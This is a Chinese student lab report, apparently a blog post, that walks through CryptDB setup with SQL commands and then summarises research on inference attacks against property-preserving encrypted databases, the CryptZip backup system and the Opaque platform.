<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-11.png" alt="图11"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-12.png" alt="图12"></p>
<p>（10）在终端3中创建数据库名称为test3；此时在终端1中显示CryptDB创建数据库test3的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create database test3;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-13.png" alt="图13"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-14.png" alt="图14"></p>
<p>（11）在终端3中打开数据库test3；此时在终端1中显示CryptDB打开数据库的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use test3;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-15.png" alt="图15"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-16.png" alt="图16"></p>
<p>（12）在终端3中新建表users。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table <span class="built_in">users</span>(<span class="built_in">id</span> int(2) not null primary key auto_increment,username varchar(40),password varchar(40));</span><br></pre></td></tr></table></figure>

<p>此时在终端1中显示CryptDB新建表users的结果。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-17.png" alt="图17"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-18.png" alt="图18"></p>
<p>（13）在终端3中的users表中增加数据。此时在终端1中显示CryptDB的users表增加数据的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(username,password) values(<span class="string">&quot;lihaolun&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-19.png" alt="图19"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-20.png" alt="图20"></p>
<p>（14）在终端3中查询表users中的记录，此时在终端1中显示CryptDB的users表查询记录的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-21.png" alt="图21"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-22.png" alt="图22"></p>
<p>（15）在终端1中发现新创建的users表在Mysql中储存的名字为table_YSAGHVKXTC，在终端2中查询以此命名的表，发现储存数据为密文，表明数据在 Mysql 端是加密的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from table_YSAGHVKXTC;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-23.png" alt="图23"></p>
<p>（16）修改CryptDB密码，更换letmein为其他密码即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> xdg-open /home/lhl/cryptdb/mysqlproxy/wrapper.lua</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-24.png" alt="图24"></p>
<p>（17）修改mysql密码，输入如下语句并按提示输入当前密码，要更改的密码，并确认密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p password</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-25.png" alt="图25"></p>
<h3 id="拓展部分"><a href="#拓展部分" class="headerlink" title="拓展部分"></a>拓展部分</h3><h4 id="对CryptDB的安全性进行调研分析"><a href="#对CryptDB的安全性进行调研分析" class="headerlink" title="对CryptDB的安全性进行调研分析"></a>对CryptDB的安全性进行调研分析</h4><p><strong>阅读Inference Attacks on Property-Preserving Encrypted Databases</strong></p>
<p><strong>（1）论文主题与研究背景</strong></p>
<p>文章评估基于property-preserving encryption(PPE)（主要是Deterministic Encryption(DTE)与Order-Preserving Encryption(OPE)）构建的加密数据库（CryptDB类设计）在“实际&#x2F;具体”场景下对抗推断&#x2F;统计攻击的安全性，提出并实证化若干有效的推断攻击。</p>
<p>CryptDB等系统通过泄露“属性”来保持查询表现，从而允许在加密上执行许多 SQL 操作。但这种“属性泄露”成为推断攻击的入口，作者系统化地构造攻击并在真实医疗数据上测试其效果以衡量风险。</p>
<p><strong>（2）威胁模型</strong></p>
<p>对手能力：比传统论文里常假定的半诚实服务器还弱，仅拥有密文数据库（ciphertext-only）且不能看到&#x2F;操控查询（但能访问到“steady-state”已被“剥洋葱”到支持查询所需层的密文列）。对手还可利用公开的&#x2F;可得的辅助数据（如州级住院公开数据、历史库、应用文档等）。</p>
<p>攻击目标：既包括individual attacks（恢复单条记录的具体字段），也包括aggregate attacks（统计信息或整库分布）。对EDB来说，恢复单个单元格就被视为成功。</p>
<p><strong>（3）四类主要攻击（方法与要点）</strong></p>
<p>作者研究并实现了4种攻击：其中两种是已知的（frequency、sorting），两种为新提出的（p-optimization、cumulative）。实现上大量利用直方图&#x2F;累积分布&#x2F;排列匹配与赋值问题（Hungarian算法&#x2F;LSAP）。</p>
<p><strong>a.Frequency analysis（针对DTE）</strong></p>
<p>思路：对密文列统计频率（histogram），用辅助数据做相同统计，把第i频率的密文映射到第i频率的明文（可按频率排序并逐一匹配）。实现非常简单但对许多现实数据非常有效。</p>
<p>DTE（Deterministic Encryption）使得：<strong>𝑚𝑖 &#x3D; 𝑚𝑗  ⇒  𝑐𝑖 &#x3D; 𝑐𝑗</strong> 因此密文频率分布与明文频率一致。</p>
<p>攻击公式：<strong>𝑓𝐶(𝑐𝑘) &#x3D; 密文第 𝑘 类的频率；𝑓𝑃(𝑝𝑘) &#x3D; 辅助数据中明文第 𝑘 类频率</strong></p>
<p>则攻击通过排序求映射：<strong>sort(𝑓𝐶)⟷sort(𝑓𝑃)</strong></p>
<p>最终输出映射：<strong>𝑐𝑘→𝑝𝑘</strong></p>
<p>适用于性别、死亡风险、疾病严重程度等稳定分布 → 恢复率可达 80–100%。</p>
<p><strong>b.p-optimization（针对DTE，作者提出）</strong></p>
<p>思路：把映射问题视为寻找一个置换，使密文直方图ψ与置换后的辅助数据直方图π的ℓp距离最小。对于p&#x3D;1 可转为线性和分配问题（LSAP），用 Hungarian算法求解；对于p&#x3D;2,3作者也给出等价的LSAP形式（因此多项式可解）。</p>
<p>优势：除了给出映射外还能输出“代价”，可用于后续判断某列是否为目标列（即攻击可定位隐藏列）。</p>
<p>构造代价矩阵：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-26.png" alt="图26"></p>
<p>求最优匹配使用 Hungarian Algorithm（匈牙利算法）求：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-27.png" alt="图27"></p>
<p><strong>𝑝&#x3D;2或𝑝&#x3D;3时攻击效果最好等价于在频率空间上求最小代价匹配论文指出表现与频率排序一致甚至更好</strong></p>
<p><strong>c.Sorting attack（针对OPE，稠密列）</strong></p>
<p>思路：如果OPE列是dense（列中包含了属性空间中几乎所有可能值，即 density&#x3D;1），排序密文并把排名一一对应到明文空间的排序即可完全恢复（不需要任何辅助数据）。对稠密列几乎是完美破解。</p>
<p>OPE 保留排序结构：<strong>𝑚𝑖&lt;𝑚𝑗  ⇒  𝑐𝑖&lt;𝑐𝑗</strong></p>
<p>​若列“足够密”（例如年龄 0~99 几乎全出现）：<strong>rank(𝑐𝑘)&#x3D;rank(𝑚𝑘)</strong></p>
<p>直接排序对齐即可恢复：<strong>𝑐(1),𝑐(2),…,𝑐(𝑛)⟷𝑚(1),𝑚(2),…,𝑚(𝑛)</strong></p>
<p>​论文实验：<strong>年龄（Age）、住院天数（LOS）可恢复95–100%。</strong></p>
<p><strong>d.Cumulative attack（针对OPE，稀疏&#x2F;低密度列，作者提出）</strong></p>
<p>思路：结合频率（histogram）和经验累积分布函数（ECDF&#x2F;CDF），把两者的不匹配度（频率差+累积分布差）作为LSAP的代价矩阵，求最小总代价的置换，从而匹配密文与明文。对低密度列也非常有效。</p>
<p>动机：对于非密集列，仅排序不够 → 结合 CDF + Histogram。</p>
<p>攻击构造：<strong>定义密文 &amp; 明文的直方图：𝐻𝐶, 𝐻𝑃</strong></p>
<p>​累积分布：<strong>𝐹𝐶, 𝐹𝑃</strong></p>
<p>​构造代价：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-28.png" alt="图28"></p>
<p>效果：<strong>Admission Type：70–100%；Length of Stay：100%；年龄：&gt; 95%</strong></p>
<p><strong>（4）实验设计与实现细节</strong></p>
<p>场景与数据：以电子病历数据库（EMR）为代表（理由：医疗数据敏感且常被作为EDB应用样例）。</p>
<p>目标数据：使用2009 HCUP&#x2F;NIS（National Inpatient Sample） 中来自约 1050 家医院的记录；实验主要针对200个大型医院（也做 200个小型医院的低密度试验）。</p>
<p>辅助数据：使用2008 Texas PUDF与2004 HCUP&#x2F;NIS（注意：目标&#x2F;辅助年份与医院集合不同，模拟现实中辅助数据并非完全相同的情况）。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-29.png" alt="图29"></p>
<p>攻击目标列：sex, race, age, admission month, patient died, primary payer, length of stay, mortality risk, disease severity, major diagnostic category, admission type&#x2F;source 等（见 Fig.1）。这些属性覆盖等值查询列与范围&#x2F;排序列（因此对应 DTE或OPE）。</p>
<p>实现工具链：Parser（Python）：把目标&#x2F;辅助数据解析为每个医院&#x2F;属性的直方图与 CDF。Column Finder（Python）：在加密数据库中定位对应属性的密文字段（利用“不同值数量”这一泄露信息来匹配候选列）。Revealer（Matlab）：实现频率分析、ℓ2-optimization、cumulative attack（Hungarian 算法求解 LSAP）。</p>
<p><strong>作者报告每个医院每次攻击耗时极短（多数在毫秒级，复杂列如length-of-stay较慢），实现可在常见工作站上复现。</strong></p>
<p><strong>（5）关键实验结果</strong></p>
<p>针对DTE（ℓ2-optimization &#x2F; frequency）：恢复mortality risk与patient died字段：对≥99%的200大型医院，能100%恢复这些患者的相关字段（即对每个病人的该字段恢复正确）。恢复disease severity：在≥51%的大医院可以对100%的患者恢复正确。对race、major diagnostic category、primary payer、admission source、admission type等也能在大量医院恢复相当高比例。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-30.png" alt="图30"></p>
<p><strong>即使是取值范围很大的age与length-of-stay，也能在大量医院恢复可观的记录比例（例如age：对≥84.5%的医院能恢复≥10%的患者年龄；length-of-stay对50%医院能恢复≥83%的患者。原因是真实分布高度集中）。</strong></p>
<p>针对OPE（sorting &#x2F; cumulative）：sorting（对dense列）可在dense的属性上完全恢复（例如disease severity、mortality risk 在大医院中density&#x3D;1的比率很高，因而可完全恢复）。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-31.png" alt="图31"></p>
<p>cumulative attack（对低&#x2F;中密度列）在200大医院上表现极好：在≥95%医院上能对disease severity, mortality risk, age, length of stay, admission month, admission type等恢复≥80%的患者；对200小医院上某些列（如 admission month、disease severity、mortality risk）在≥99.5%医院能100%恢复。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-32.png" alt="图32"></p>
<p><strong>整体结论：在现实医疗数据场景下，PPE-based EDB（如CryptDB）在 steady-state 下对这些推断攻击极脆弱。作者认为不应在EMR等敏感领域使用这类系统，且实验结果应被视作对PPE-EDB的下界（作者并未利用query-leakage、也未攻击更弱的join层，实际风险可能更高）。</strong></p>
<p><strong>（6）作者结论</strong></p>
<p><strong>PPE（DTE&#x2F;OPE）为执行性和兼容性付出了信息泄露代价；这些泄露结合公共&#x2F;历史数据足以在大量现实场景下高准确率恢复敏感字段。对医疗EDB，作者明确建议不要采用这类设计（至少不能以当前形式用于高度敏感数据）。</strong></p>
<p><strong>（7）对CryptDB&#x2F;PPE-based EDB的安全性分析</strong></p>
<p><strong>为什么会被攻破（根本原因）：</strong>CryptDB的“洋葱加密”会在steady-state下将某些列剥到DTE或OPE，以支持等值或范围查询；而DTE&#x2F;OPE本质上泄露了相等性或排序&#x2F;秩信息，这些属性在现实数据中包含大量可利用的统计特征（频率分布、CDF、value-set大小等），因此可被外部辅助数据&#x2F;统计方法映射回明文。</p>
<p><strong>对策方向（权衡安全↔性能）：</strong>不要在高敏感度数据（如EMR）上使用 DTE&#x2F;OPE：若一定要使用，明确承认风险并做额外缓解。</p>
<p><strong>使用更强的构造：</strong>如FHE&#x2F;ORAM&#x2F;secure enclaves（SGX）来减少结构泄露。但这些通常有性能或部署成本（或有额外信任假设）。CryptDB-like设计的替代方案：交互式OPE（泄露更少的顺序信息）或ORE，但理论上仍然会有泄露；ORAM可隐藏访问模式但昂贵。</p>
<p><strong>最小化PPE的使用范围：</strong>仅对非敏感列或在导出统计时使用；对关键列使用randomized &#x2F; stateful encryption（避免可重复密文）。</p>
<p>引入噪声&#x2F;分区&#x2F;填充策略：在生成直方图&#x2F;查询输出前对分布做掩码（类似差分隐私思想），或对列值做随机化&#x2F;桶化以降低精确匹配的可行性。但这些会影响查询精度与性能。</p>
<p><strong>减少auxiliary-data可用性与列标识泄露：</strong>CryptDB的匿名化schema、列值个数泄露、以及onion剥离过程均暴露信息——设计上应尽量隐藏列上“distinct count”或对Column Finder的信息进行混淆（例如加入dummy列，或对distinct count做模糊化&#x2F;噪声）。论文里Column Finder利用distinct-value数量定位目标列是一个关键步骤。</p>
<p><strong>监测与速率限制：</strong>检测异常的整体统计获取行为，限制对全库直方图&#x2F;导出类操作的权限（但注意：论文在ciphertext-only情况下就能恢复，query-based限制并不能完全阻止）。</p>
<p>（8）总结</p>
<p>CryptDB通过“洋葱式加密（onion encryption）”结构实现了在不解密数据的前提下支持SQL查询的目标。其核心机制是在每个数据列外包裹多层加密，每层对应一种查询操作（如相等查询的确定性加密层DTE、范围查询的序保持加密层OPE等），当应用需要执行相应查询时，系统逐步剥离外层密文，暴露满足功能要求的最弱层。然而，这种属性保留型加密（Property-Preserving Encryption, PPE）不可避免地泄露部分结构信息——如值之间的相等性与顺序关系。</p>
<p>从理论上看，DTE与OPE的安全性仅在极其受限的明文分布假设下才能保证，而在实际场景中，明文往往呈现明显的统计规律（如医疗数据中的年龄分布、疾病等级、支付类型等）。正因如此，《Inference Attacks on Property-Preserving Encrypted Databases》实验证明，即便在最保守的密文仅可见模型下（ciphertext-only setting），攻击者仍能利用公开辅助数据与统计特征，通过频率分析、最优匹配（ℓ₂-optimization）或累积分布攻击（cumulative attack）等方法，以极高的精度恢复被加密字段的真实值。在医疗场景中，对部分字段（如病情严重程度、死亡风险）的恢复率甚至达到99%以上。这意味着CryptDB在实际部署后处于稳定运行状态（steady state）时，其泄露的属性足以使攻击者重建大量敏感信息。</p>
<p>因此，CryptDB的安全性问题并非源于密码算法本身，而是其系统设计所固有的“功能–隐私权衡”导致：为实现可查询性而牺牲了部分语义安全。攻击结果表明，PPE 层所暴露的模式信息在现实数据中具有极强的可区分性，足以支撑精确推断。这种结构性泄露无法通过传统的密钥管理或访问控制修复，必须在系统层重新设计，例如引入更强的加密形式（如可验证同态加密、ORAM 或安全执行环境）或在查询输出中加入差分隐私机制以降低可识别性。</p>
<p><strong>总体而言，CryptDB 的设计在性能与安全之间做出了大胆但危险的折中，其在高敏感度数据场景（如医疗、金融、政府数据库）中已被证明无法提供足够的机密性保证。</strong></p>
<h4 id="对CryptDB的功能改进进行调研分析"><a href="#对CryptDB的功能改进进行调研分析" class="headerlink" title="对CryptDB的功能改进进行调研分析"></a>对CryptDB的功能改进进行调研分析</h4><p><strong>阅读CryptZip: Squeezing out the Redundancy in Homomorphically Encrypted Backup Data</strong></p>
<p><strong>（1）研究主题与总体概述</strong></p>
<p>文章聚焦于同态加密数据库的备份优化问题。在云计算与数据安全需求不断提升的背景下，数据库往往采用加密存储以保护敏感信息。然而，这种设计在带来安全性的同时，也使得数据在备份与恢复阶段出现了极高的存储成本与性能开销。特别是像CryptDB这样的部分同态加密数据库系统，为了在密文上直接执行SQL查询，不可避免地对同一数据项生成多份加密副本，以支持不同类型的操作（例如相等比较、范围查询、求和等）。这类“多洋葱加密结构”虽然增强了系统功能性，却导致数据库体积成倍膨胀。</p>
<p>论文作者提出的CryptZip系统，旨在在不破坏安全性的前提下，通过分析加密元数据，自动识别出冗余加密列并进行选择性备份，从而显著减少加密数据的备份存储成本。</p>
<p>CryptZip的设计目标可以概括为两个方面：一<strong>是显著降低加密数据库备份所需的存储空间，二是在此基础上尽量缩短灾难恢复的时间开销。</strong>作者在设计中综合考虑了<strong>安全性、可恢复性和效率</strong>三者的平衡，提出了<strong>可调节的备份策略框架</strong>，使系统能在不同场景下灵活取舍。</p>
<p><strong>（2）研究背景与问题提出</strong></p>
<p>随着云数据库广泛部署，用户数据的安全威胁愈加严重。数据库管理员、云服务提供者甚至外部攻击者都可能通过各种方式非法访问后端存储。传统应对方法是对数据进行加密存储，但这会阻断SQL查询的直接执行。为解决这一矛盾，MIT提出了著名系统CryptDB，它通过在每个数据列外包裹多层加密（称为 onion encryption）来支持在密文上执行查询操作。每一层加密采用不同的部分同态加密算法（例如确定性加密DET、序保持加密OPE、同态加法加密HOM、可搜索加密SEARCH等），系统根据查询需求动态剥离或启用相应的加密层。</p>
<p>然而，这种设计存在一个关键的副作用，<strong>数据冗余严重</strong>。为了保证所有类型的查询都能执行，同一个明文字段往往被多次加密并分别存储为多个“洋葱副本”，导致数据库空间开销成倍增长。论文指出，在TPC-C基准测试下，CryptDB数据的备份文件大小从明文的79MB增加到了1.68GB，膨胀约21.3倍。更糟糕的是，由于加密密文的随机性极高，传统压缩算法（如Gzip）几乎无法发挥作用，仅能减少约15%的空间。因此，在大规模云环境中维护周期性备份或跨数据中心冗余备份时，存储成本和网络带宽消耗都异常巨大。</p>
<p><strong>作者因此提出核心研究问题：是否可以在不解密数据、不破坏安全性的前提下，有效去除加密数据备份中的冗余信息，从而显著降低存储开销？这一问题成为CryptZip系统设计的出发点。</strong></p>
<p><strong>（3）系统设计理念与总体结构</strong></p>
<p>CryptZip的基本思想是利用<strong>CryptDB系统的元数据信息（metadata）</strong>。在CryptDB架构中，代理层（Proxy）维护了每个数据库表的加密细节，包括各列使用的加密方案及对应的密文列名。作者发现，这些元数据实际上可以揭示出哪些列是由同一个明文字段复制加密而来，即所谓“语义冗余列”。基于这一观察，CryptZip通过解析元数据来识别冗余关系，然后在备份阶段<strong>只选择其中一个或少数几个代表性加密列进行存储</strong>，从而达到“逻辑压缩”的效果。系统整体由三个主要部分构成：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-33.png" alt="图33"></p>
<p><strong>元数据解析模块</strong>：从CryptDB代理获取每个表的加密映射关系，确定明文字段与其多洋葱加密副本之间的对应。</p>
<p><strong>选择性备份模块</strong>：根据预设策略（空间优先、时间优先或平衡策略），选择某些加密列作为“恢复洋葱（recovery onion）”进行备份。</p>
<p><strong>恢复模块</strong>：在灾难恢复时，通过解密备份的 recovery onion 并重新加密生成其他洋葱副本，完整恢复数据库。这种方法完全在密文与加密层级上操作，不需要访问明文数据库，也不改变CryptDB的查询逻辑，从而保证了系统的安全性与透明性。</p>
<p><strong>（4）备份策略与理论模型</strong></p>
<p>论文进一步提出了一个Min-Space模型来指导备份策略的制定。模型的目标是在给定恢复时间限制的前提下，使总存储空间开销最小化。设一个字段被多种洋葱加密后形成加密集，其中每个洋葱的密文大小为 ，加密与解密时间分别为，并用布尔变量 表示是否可解密。作者建立了如下优化目标：</p>
<p>① 空间开销：</p>
<p>$$ SF &#x3D; \sum_{O \in OS} S_{O} $$</p>
<p>② 恢复时间：</p>
<p>$$ Ext(OS) &#x3D; \min_{O \in OS}(T_{D}) + \sum_{O \in (OA - OS)} T_{E} $$</p>
<p><strong>③约束条件</strong>：至少选择一个可解密洋葱，即 。</p>
<p>在此模型下，作者提出三种可供实际系统使用的备份策略：</p>
<p><strong>①Space-optimal（空间最优策略）</strong>：只保留一个最小可解密洋葱，空间最省但恢复时间最长。</p>
<p><strong>②Balanced（平衡策略）</strong>：保留部分洋葱，在节省空间与恢复速度之间折中。</p>
<p><strong>③Time-optimal（时间最优策略）</strong>：保留全部洋葱，不节省空间但恢复最快。</p>
<p><strong>作者还指出，不同数据类型（整数、字符串）使用的加密算法差异明显。例如，字符串类型中只有DET可被解密，因此在字符串列的备份中必须保留 DET 层；而整数列的各洋葱（如DET、OPE、HOM、ASHE）均可解密，因此存在更多组合选择。</strong></p>
<p><strong>（5）实验设计与评估方法</strong></p>
<p>为了评估CryptZip的有效性，作者在两台高性能服务器上搭建了实验环境，系统配置包括8核 Intel Xeon E5-2630 v4 处理器、64GB 内存与 MySQL 5.7 数据库。测试使用两类基准：</p>
<p><strong>微型基准（Micro-benchmarks）</strong>：包含一个整型表（100万随机整数）和两个字符串表（长度分别为16B与128B），用于测量加密层的加密时间、解密时间与压缩率。</p>
<p><strong>TPC-C基准</strong>：标准在线事务处理数据库，包含多种字段类型，用于综合评估系统在实际场景下的备份空间与恢复性能。</p>
<p>实验对比了多种方案：原始MySQLDump备份、Gzip压缩后的加密备份、以及CryptZip在三种策略下的表现。测试重点关注两个指标：<strong>存储空间成本（Storage Cost）与恢复时间（Recovery Time）</strong>。</p>
<p><strong>（6）实验结果与分析</strong></p>
<p>在Micro-benchmark中，CryptZip在不同数据类型和加密组合下均显示出显著的空间节省。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-34.png" alt="图34"></p>
<p>对于整型数据，采用HOM加密方案时，Space-optimal策略将存储开销从 345MB降至20MB（仅为5%），但恢复时间高达5800秒。Balanced策略则能在存储减少82%的同时，将额外恢复时间控制在 143 秒以内。采用 ASHE 加密方案时，Balanced策略同样表现出良好平衡，存储减半、恢复时间减少20%。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-35.png" alt="图35"></p>
<p>对于字符串数据（16B与128B），随着字符串长度增加，OPE层的相对开销下降。Space-optimal策略可节省70%以上的存储空间，而Balanced策略在保证恢复速度的情况下仍能减少约55%的存储成本。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-36.png" alt="图36"></p>
<p>在<strong>TPC-C 综合测试</strong>中，结果更加显著。普通明文数据库的备份文件大小为 79MB，而加密后达到1680MB，使用Gzip压缩仍高达1432MB。相比之下，CryptZip的Space-optimal策略将其压缩到160MB，节省高达**90.5%<strong>的空间；Balanced策略在仅增加约5分钟恢复时间的前提下，仍能节省</strong>55%**的存储成本。这些结果充分证明了CryptZip在安全备份场景中的高效性和实用价值。</p>
<p><strong>（7）论文结论与未来工作</strong></p>
<p>论文总结指出，CryptDB通过多层洋葱加密实现了密文可查询性，但也因此带来了极高的冗余和存储膨胀问题。CryptZip通过解析加密元数据，利用语义层冗余信息在逻辑层面实现了“压缩”，从而在不破坏安全性的条件下显著降低了备份空间。系统提出的 Min-space分析模型为加密数据库的备份策略提供了量化依据。实验证明，CryptZip在TPC-C基准下可实现70%–90.5%的存储节省。</p>
<p><strong>当前的恢复过程需要对备份数据进行解密并重新加密生成各层洋葱，这可能引入潜在安全风险。未来计划结合硬件可信执行环境（TEE）技术，如Intel SGX或AMD Memory Encryption，将恢复过程封装于硬件安全边界内，从而进一步增强系统的安全性与可信性。</strong></p>
<p><strong>（8）对CryptDB功能改进的分析</strong></p>
<p>从系统架构角度看，CryptZip对CryptDB的主要改进集中在<strong>存储与运维层</strong>。首先，它通过引入“元数据感知”的备份机制，使CryptDB能够在加密状态下进行智能化去冗余存储，这是原系统所缺乏的能力。其次，CryptZip赋予数据库管理员可调节的备份策略接口，用户可以根据业务场景选择空间优先或恢复优先方案，实现灵活的性能权衡。再次，CryptZip改善了加密数据的可压缩性，使加密数据库在云端部署与备份时更具经济性。更重要的是，该方案保持了与原有CryptDB架构的兼容性，无需修改查询代理或数据库引擎，因此易于集成与扩展。</p>
<p>未来的改进方向包括：在恢复阶段引入硬件安全模块以避免明文暴露；结合差分隐私或噪声注入技术以进一步提升安全性；以及将元数据驱动的去冗余理念扩展到增量备份与跨版本同步场景。</p>
<p><strong>总体而言，CryptZip的提出不仅优化了CryptDB的存储效率，也为加密数据库的系统性设计提供了新的思路，即在保持安全的前提下，通过结构层信息挖掘提升系统资源利用率。</strong></p>
<h4 id="对同类系统调研分析"><a href="#对同类系统调研分析" class="headerlink" title="对同类系统调研分析"></a>对同类系统调研分析</h4><p>Opaque是由Wenting Zheng等人提出的一个面向分布式大数据分析的机密计算平台，其论文题为“Opaque: An Oblivious and Encrypted Distributed Analytics Platform”，并在NSDI&#x2F;OSDI系列会议上发表。Opaque的目标是让用户能够把敏感数据加密并上传到不受信任的云集群上，同时在云端以接近原生Spark SQL 的方式运行复杂分析查询，但又不将明文数据或访问模式泄露给云平台或管理员。为此，Opaque将数据加密、计算完整性校验与“oblivious（不泄露访问模式）”的分布式算子结合起来，构成一个可扩展的、能够支持关系算子的机密分析平台。</p>
<p><strong>在动机层面，</strong>Opaque关注两类典型威胁：一是云平台或操作系统级别的恶意或被攻破组件会直接读取内存或持久化的数据；二是即便数据在安全执行环境（如 Intel SGX）中被保护，数据访问模式（access patterns）仍可能通过外部可观察的内存&#x2F;IO行为被泄露（例如通过页面&#x2F;缓存&#x2F;IO监测推断出查询的热点、排序或筛选条件）。Opaque的出发点是仅靠把代码放进TEE并不能阻止访问模式泄露，必须在算子设计层面提供“obliviousness”来阻断基于访问模式的推断攻击。论文对威胁模型与保护目标做了清晰定义：保护数据的机密性、保护查询的访问模式（即保证 obliviousness），并提供计算结果的完整性验证。</p>
<p><strong>在架构与实现上，</strong>Opaque基于Spark SQL做了有限改造：它保留了Spark的执行模型（RDD&#x2F;分区等），但在数据读入、Shuffle、Join、GroupBy、排序等关键阶段替换或增强了算子，使用**分布式的 oblivious 算子（例如 oblivious shuffle &#x2F; oblivious global sort &#x2F; oblivious join）**来隐藏跨节点与跨分区的访问模式。为了把可扩展性和机密性结合起来，Opaque 将实际的密文数据与代码一起放入 SGX enclaves中执行，但对外部的I&#x2F;O和内存访问采用确定清洗（deterministic padding、dummy records、fixed-size transfers）等技巧，确保外界无法从通信量、请求序列或磁盘&#x2F;内存访问显著区分真实数据的结构。实现上，Opaque在Spark上做了“最少侵入”修改，使得用户可以仍然用熟悉的SQL API提交查询，而平台在后台替换为安全的执行计划。</p>
<p><strong>Opaque的核心技术贡献可分为三类：一是分布式oblivious算子库（包括oblivious repartition&#x2F;oblivious global sorting&#x2F;oblivious join等），</strong>这些算子保证在外部可观测的行为上（如每个阶段的I&#x2F;O模式与网络流量）对不同输入产生相同的外部特征；<strong>二是查询规划与优化，</strong>即如何在可接受代价内把一个给定的SQL查询分解为一系列oblivious与非-oblivious算子的混合计划，从而在性能与隐私之间做工程化折中；<strong>三是系统集成与工程实践。</strong>把SGX enclave、网络协议、数据加密与Spark的执行引擎整合，使系统在真实集群上可运行并评估。论文提供了这些算子的设计细节（例如基于ORAM风格的局部buffering+阶段性交换来实现oblivious shuffle）并讨论了代价模型。</p>
